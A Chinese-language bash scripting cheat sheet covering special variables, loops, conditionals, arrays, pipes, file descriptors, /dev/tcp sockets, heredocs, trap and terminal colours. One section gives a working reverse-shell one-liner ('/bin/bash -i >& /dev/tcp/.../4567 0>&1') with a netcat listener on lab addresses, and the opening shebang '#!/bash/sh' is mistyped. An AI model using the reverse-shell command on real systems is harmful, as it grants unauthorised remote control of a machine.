首行,代表使用的命令，相应目录必须正确
#!/bash/sh  



SHELL脚本
参数
变量说明: 
$$ #Shell本身的PID（ProcessID） 
$! #Shell最后运行的后台Process的PID 
$? #最后运行的命令的结束代码，即获取函数返回值 
$- #使用Set命令设定的Flag一览 
$* #所有参数列表。如"$*"用「"」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。 
$@ #所有参数列表。如"$@"用「"」括起来的情况、以"$1" "$2" … "$n" 的形式输出所有参数。 
$# #添加到Shell的参数个数 
$0 #Shell本身的文件名 
$1-$n #添加到Shell的各参数值。$1是第1参数、$2是第2参数…。





函数
xyz()				  ##可在前面添加function前缀
{
	let a=$1+$2+$3    ##参数为 $1,$2,$3...以此类推，let指定后面为数学计算，可用((a=$1+$2+$3))代替
	return $a		  ##函数返回值，运行函数后使用$?获取
}
xyz 1 4 5            ##执行函数，后面为参数
echo $?               ##输出返回值

for                   ##for循环，可以使用((i=0;i<10;i++))
do
...
done

for i in 1 2 3 4 5    ## for i in `seq 5`
do
....
done

while				  ##while循环，可以使用((i<10))
do
...
done

if
then
...
else
...
fi

if [ $a -gt 0 ] 2>/dev/null; then     ###将错误信息忽略
echo "is number"
else 
echo "is not number"
fi

if [[ "11123213" =~ [0-9]{8} ]]; then  ##使用正则表达式   
echo "yyy"
else echo "nnn" 
fi

case $flag in
	start)
	${command1}
	;;
	stop|shutdown)
	${command2}
	;;
	*)
	${command3}
	;;
esac

if [[ $x ]] && [[ $x = xx ]];then 
echo 111; 
fi  



###逐个获取脚本后的参数 opt不是关键字，可以使用任意名字
for opt do
	echo $opt
done

shift 参数移动，用于逐个获取参数


set -- v1 v2 v3     
##重置位置参数
##$1    ##1=v1
##$2    ##2=v2
##$3    ##3=v3

set -x          # 执行指令前，先输出指令
#set -o xtrace  # 与set -x效果一样  



数组
a="3306,3307,3308"
OLD_IFS=$IFS
IFS=","
arr=($a)
IFS=$OLD_IFS
for s in ${arr[@]}
do
	echo $s
done


${#arr[*]}
数组的个数

z_ip=()
z_ip[1]="123"
z_ip[2]="234"
echo ${z_ip[1]}
echo ${z_ip[@]}



if test (表达式为真)    ###判断  判断文件是否存在等
touch filename  ##创建文件

if [ -z $dc ];then 	 ##字符长度为0
echo "not exist"; 
else 
echo "exist"; 
fi

-e  文件或目录是否存在
-d  目录
-f  文件
-L  符号链接
-r  可读
-w  可写
-x  可执行



${command1} && ${command2}     #前面执行成功才执行后面的语句
${command1} || ${command2}	   #前面执行失败才执行后面的语句




mkfifo my_pipe  					##创建管道，"|"为无名管道

###进程一
echo "abcd" > my_pipe				###写入管道时没有读取操作，写入操作会停滞
###进程3二
cat my_pipe							###读取管道时没有数据，读取操作会停滞

rm -rf my_pipe						###删除管道


posix标准要求每次打开文件时必须使用当前进程的最小可用文件描述符。


文件描述符
/proc/self/fd
0	stdin
1	stdout
2	stderr

使用exec自定定义、绑定文件操作符  
#管道可以跨进程看到
#文件描述符只能当前进程看到
exec 200<>my_pipe   ###对文件200的操作等同于对管道my_pipe的操作。使用绑定文件可以避免停滞
			
echo >&200			###以管道使用，输入空行，不停滞
read -u200			###读取管道，以行读取，如果读取不到则停滞
					
exec 200>&-			###关闭绑定
exec 200<$-


exec 300<&200       ###拷贝200管道成300管道 即两个管道可以互用

exec <$file         #将普通文件内容作为标准输入
exec >$file         #将标准输出写入普通文件
exec 3<$file        #将普通文件内容写入管道3


read -u${n}			###从描述符号位n的文件中读取。缺省为0，即为stdin。



#相当于连接 127.0.0.1 6379
exec 100<>/dev/tcp/127.0.0.1/6379

#发送消息
echo info >&100

#关闭连接
exec 100>&-
#exec 100<$-

#打开连接时描述文件创建  关闭时删除
ls -altr /proc/self/fd/100



反弹shell

#192.168.4.166
nc -lv  4567  

#192.168.4.165
/bin/bash -i >& /dev/tcp/192.168.4.166/4567 0>&1
 
#192.168.4.166即可获得192.168.4.165的shell
 
 
读写这个文件相当于使用socket建立连接
/dev/tcp/$target_ip/$target_port
/dev/udp/$target_ip/$target_port


客户端
exec 100>/dev/tcp/$target_ip/$target_port

#发送
echo -e "what you want to send" >&100

#接收
cat <&100

exec 100>&-
exec 100<$-



服务端？不可以用
/dev/tcp-server/$listen_ip/$target_port
/dev/udp-server/$listen_ip/$target_port

服务端

exec 100>/dev/tcp-server/$listen_ip/$listen_port

cat <&100

exec 100>&-
exec 100<$-


x=`cat`				###脚本中从输入获取字符串

read -p "prompt" arg	###输出提示，将输入值传给arg。没有arg则传入REPLY

cat filename | while read line		###将文件读入line中，line为变量
do
${command} $line
done

read arg_name						##从终端读取数据赋值给变量，可以有多个变量名
-p "you commemt"	输出提示字符


x=`date +%Y`   ###执行命令后将结果保存在变量中
x=$(date +%Y)



trap '' 1 2 3 15 			###忽略信号，在脚本中使用

trap 'commands' signals 	###接收到信号时执行commands

trap "echo 'hello'" INT		###键盘ctrl+c，执行echo hello命令


set -Eeuo pipefail          ##脚本头部使用 当运行出现错误时结束脚本（默认会继续运行）


trap cleanup SIGINT SIGTERM ERR EXIT        #发起ctrl+c/运行出现错误/运行结束 执行特定操作，如脚本的清理操作

cleanup() {
  trap - SIGINT SIGTERM ERR EXIT
  # script cleanup here
}

()、(())、[]、[[]]、{}
()      ##在括号中的命令组，为一个子shell;初始化数组
(())    ##用于计算数值结果，变量可不用加$,
[]	    ##条件测试
[[]]	##
{}		##代码块，如{command1;command2;...}；参数扩展,如 ${xyz}	



#实现自动处理交互
#!/usr/bin/expect
expect -c {
set timeout 300
spawn $CMD
expect{
$CASE1 {send $WORD1} 
$CASE2 {send $WORD2} 
}
expect ...

}



##将流传给命令
cat >>./filename <<EOF
${linetxt}
EOF

cat <<EOF
${linetxt}
EOF

mysql ... << EOF
use xxx;
create ...
EOF

#EOF并不是关键字 可以使用任意字符代替


##文字高亮
i=33
echo -e "\e[1;${i}m ok \e[0m"  
#重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37
i=33
w="what you want to output"
echo -e "\e[1;${i}m${w}\e[0m"  

#背景高亮
i=2     #行
j=10    #列
k=44    #颜色
echo -e "\033[${i};${j}H\033[${k};31m \033[0m"
#重置=0，黑色=40，红色=41，绿色=42，黄色=43，蓝色=44，洋红=45，青色=46，白色=47

i=33 #前景色
j=41 #背景色
w="what you want to output"  
echo -e "\0${i}[${j}m${w}\0${i}[0m"


echo -en "\b\b\b\b""e"     #-n 不换行
sleep 1
echo -en "\b\b\b\b""f"     #\b 删除之前的字符

printf #不换行输出

# 如果aaa为空，则被赋值；否则保持为原来值
: ${aaa:=bbb}

#在一个2元命令中, 提供一个占位符, 表明后面的表达式, 不是一个命令
: $((n=$n+1))


# 去除前后空格
echo " a a " | sed 's/^\s*//g' | sed 's/\s*$//g' 
echo " a a " | awk '$1=$1'                    
